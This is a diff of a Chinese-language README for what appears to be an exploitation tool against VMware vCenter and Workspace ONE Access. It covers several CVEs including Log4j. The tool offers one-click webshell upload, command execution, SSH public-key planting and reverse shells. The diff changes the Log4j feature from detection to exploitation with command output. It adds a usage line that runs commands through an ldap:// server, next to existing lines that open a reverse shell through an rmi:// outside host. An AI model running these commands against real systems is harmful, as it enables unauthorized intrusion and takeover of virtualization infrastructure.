@@ -28,7 +28,7 @@ Vmware workstation One Access ...
 VMware vRealize Operations Manager ...
 #### 1.它是什么
 
-一款针对Vcenter（暂时）的综合**验证**工具，包含目前最主流的CVE-2021-21972、CVE-2021-21985以及CVE-2021-22005，提供一键上传webshell，命令执行或者上传公钥并使用SSH连接的功能，以及针对Apache Log4j CVE-2021-44228漏洞在Vcenter上的检测和验证。
+一款针对Vcenter（暂时）的综合**验证**工具，包含目前最主流的CVE-2021-21972、CVE-2021-21985以及CVE-2021-22005，提供一键上传webshell，命令执行或者上传公钥并使用SSH连接的功能，以及针对Apache Log4j CVE-2021-44228漏洞在Vcenter上的检测以及利用，比如命令执行并获取回显。
 
 #### 2.它的定位
 
@@ -48,6 +48,7 @@ go build -o main.exe
 ./main.exe -u https://192.168.1.1 -m 21985 -t rshell -r rmi://xx.xx.xx.xx:1099/xx
 ./main.exe -u https://192.168.1.1 -m log4center -t scan // scan log4j
 ./main.exe -u https://192.168.1.1 -m log4center -t rshell -r rmi://xx.xx.xx.xx:1099/xx //get reverseshell and other
+./main.exe -u https://192.168.1.1 -m log4center -t exec -r ldap://xx.xx.xx.xx:1389 -c whoami //execute command
 ./main.exe -u https://xx.xx.com -m 22954 whoami
 ./main.exe -u https://xx.xx.com -m 22972 //get cookie
 ./main.exe -u https://xx.xx.com -m 31656 //If CVE-2022-22972不能用就换CVE-2022-31656
@@ -69,6 +70,7 @@ V1.1 针对CVE-2021-21985添加了利用rmi反弹shell的功能，前提是你�
 V1.2 增加了针对Vcenter的log4j检测和验证能力
 V1.3 增加了对Vmware WorkSpace One Access的漏洞验证功能，包括CVE-2022-22954 远程命令执行；CVE-2022-22972、CVE-2022-31656身份鉴别绕过
 V1.3.1 修复了检测log4j时忽略了端口的问题，有的服务会更改默认的443端口
+V1.3.2 修改了针对log4j的利用方式，通过tomcatbypassEcho的方式执行命令并获取回显。vcenter 7.0 linux测试通过。
 ...
 ```
 
